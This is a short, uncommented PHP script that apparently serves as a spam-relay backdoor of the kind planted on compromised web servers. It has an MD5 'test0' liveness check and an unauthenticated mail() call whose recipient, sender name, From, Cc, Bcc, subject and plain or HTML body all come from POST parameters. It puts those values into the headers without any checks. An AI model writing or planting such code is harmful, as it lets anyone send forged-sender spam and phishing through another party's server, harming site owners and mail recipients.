if (isset($_GET["test0"])) { print md5($_GET["test0"]); die(0); }
if (!isset($_POST["fm"])) die(0);
$header = "";
if (isset($_POST["cc"])) { $header .= "Cc: "; $header .= $_POST["cc"]; $header .= "\r\n"; }
if (isset($_POST["bcc"])) { $header .= "Bcc: "; $header .= $_POST["bcc"]; $header .= "\r\n"; }
$to=$_POST["t"];
$subj=$_POST["s"];
if (isset($_POST["txt"])) { 
 $txt=$_POST["txt"];
 $header.="From: ";
 if (isset($_POST["f"])) $header.=$_POST["f"]." <";
 $header.=$_POST["fm"];
 if (isset($_POST["f"])) $header.=">";
 $header.="\r\n";
 $header.="To: $to\r\n"; 	

} elseif (isset($_POST["html1"])) {  
$text=$_POST["html1"];
 $header.="From: ";
 if (isset($_POST["f"])) $header.=$_POST["f"]." <";
 $header.=$_POST["fm"];
 if (isset($_POST["f"])) $header.=">";
 $header.="\r\n";
 $header.="To: $to\r\n"; 
 $header.="Mime-Version: 1.0\r\n"; 
 $header.="Content-Type: text/html; charset=iso-8859-1\r\n";
 $header.="Content-Transfer-Encoding: quoted-printable\r\n\r\n";
 $txt=$text; 
}
if (mail($to, $subj, $txt, $header)) { echo "ehhh"; die(0); } else { echo "fuel"; die(0); }
